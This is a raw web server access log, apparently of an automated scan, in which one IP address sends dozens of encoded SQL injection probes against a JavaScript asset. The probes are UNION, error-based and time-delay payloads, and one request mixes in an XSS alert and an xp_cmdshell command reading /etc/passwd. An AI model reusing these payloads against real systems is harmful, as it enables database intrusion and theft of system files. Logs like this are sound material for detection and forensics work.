141.98.80.95 - - [20/Feb/2020:17:01:21 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:22 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20ORDER%20BY%203948%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:22 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:22 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:22 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:23 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:23 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:23 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:23 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:24 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20ORDER%20BY%206007%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:24 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:24 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:25 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20ORDER%20BY%201%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:25 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:25 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:25 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:25 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:25 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:31 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530&JUdx%3D3389%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:31 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%2C%2C%28%27%27%27%27.%27%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:31 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:33 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20AND%206390%3D6390%20AND%20%27craV%27%3D%27craV HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:33 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20AND%206390%3D6390%20AND%20%281001%3D1001 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:33 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%206003%3D1406 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:33 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%20AND%206390%3D6390%20AND%20%28%27EXas%27%3D%27EXas HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:33 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20AND%204741%3D7738%20AND%20%27YhPA%27%3D%27YhPA HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:34 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20AND%205941%3D1629%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:34 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=%28SELECT%20%28CASE%20WHEN%20%282209%3D6442%29%20THEN%202209%20ELSE%202209%2A%28SELECT%202209%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:34 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%20%28SELECT%201772%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178626a71%2C%28SELECT%20%28ELT%281772%3D1772%2C1%29%29%29%2C0x7178707671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:34 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%20%28SELECT%201772%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178626a71%2C%28SELECT%20%28ELT%281772%3D1772%2C1%29%29%29%2C0x7178707671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20kiJh HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:34 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20AND%20%28SELECT%201772%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178626a71%2C%28SELECT%20%28ELT%281772%3D1772%2C1%29%29%29%2C0x7178707671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:34 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20AND%206390%3D6390%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:34 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=%28SELECT%20%28CASE%20WHEN%20%283916%3D3916%29%20THEN%203916%20ELSE%203916%2A%28SELECT%203916%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:34 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%20AND%20%28SELECT%201772%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178626a71%2C%28SELECT%20%28ELT%281772%3D1772%2C1%29%29%29%2C0x7178707671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27MYQB%27%3D%27MYQB HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:35 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%201561%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281561%3D1561%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20ItyC HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:35 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20AND%201561%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281561%3D1561%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27RJWg%27%3D%27RJWg HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:35 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%201866%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281866%3D1866%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:35 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%20AND%201866%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281866%3D1866%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%28%27PCbJ%27%3D%27PCbJ HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:35 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20AND%201866%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281866%3D1866%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:35 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%201561%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281561%3D1561%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:35 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20AND%201561%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281561%3D1561%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:36 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%203126%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283126%3D3126%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:36 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20AND%203126%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283126%3D3126%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:36 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=%28SELECT%20CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286267%3D6267%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:36 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20AND%203126%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283126%3D3126%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%287948%3D7948 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:36 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%20AND%203126%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283126%3D3126%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27HXFm%27%3D%27HXFm HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:36 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=%28SELECT%201056%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7178626a71%2C%28SELECT%20%28ELT%281056%3D1056%2C1%29%29%29%2C0x7178707671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:36 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=%28SELECT%20%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283462%3D3462%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:36 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:37 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:37 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:37 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:37 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:37 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:38 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28104%29%7C%7CCHR%28108%29%7C%7CCHR%28112%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:38 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%20SLEEP%285%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:38 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%20SLEEP%285%29--%20vpJe HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:38 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20AND%20SLEEP%285%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:38 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28104%29%7C%7CCHR%28108%29%7C%7CCHR%28112%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:38 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28104%29%7C%7CCHR%28108%29%7C%7CCHR%28112%29%7C%7CCHR%2889%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:38 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20AND%20SLEEP%285%29%20AND%20%27LYWe%27%3D%27LYWe HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:38 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20AND%206063%3D%28SELECT%206063%20FROM%20PG_SLEEP%285%29%29%20AND%20%285554%3D5554 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:39 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20AND%206063%3D%28SELECT%206063%20FROM%20PG_SLEEP%285%29%29%20AND%20%27WGbr%27%3D%27WGbr HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:39 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20pUMX HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:39 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%284043%3D4043 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:39 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20WAITFOR%20DELAY%20%270%3A0%3A5%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:39 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27MgrU%27%3D%27MgrU HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:39 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%29%20AND%201477%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%28110%29%7C%7CCHR%2868%29%7C%7CCHR%28101%29%2C5%29%20AND%20%28%27FPfc%27%3D%27FPfc HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%25%27%20AND%201477%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%28110%29%7C%7CCHR%2868%29%7C%7CCHR%28101%29%2C5%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20ORDER%20BY%203608--%20VFfv HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20UNION%20ALL%20SELECT%20NULL--%20DEHH HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%201477%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%28110%29%7C%7CCHR%2868%29%7C%7CCHR%28101%29%2C5%29 HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%20AND%201477%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%28110%29%7C%7CCHR%2868%29%7C%7CCHR%28101%29%2C5%29--%20BfOB HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%27%20AND%201477%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%28110%29%7C%7CCHR%2868%29%7C%7CCHR%28101%29%2C5%29%20AND%20%27foPf%27%3D%27foPf HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20ORDER%20BY%201--%20cLCX HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20IOHQ HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20CSmr HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:40 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20AbmD HTTP/1.1" 200 714
141.98.80.95 - - [20/Feb/2020:17:01:41 +0100] "GET /templates/creator/m_f/fa/fa7/164/assets/slide.js?v=1519138530%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20TLHH HTTP/1.1" 200 714
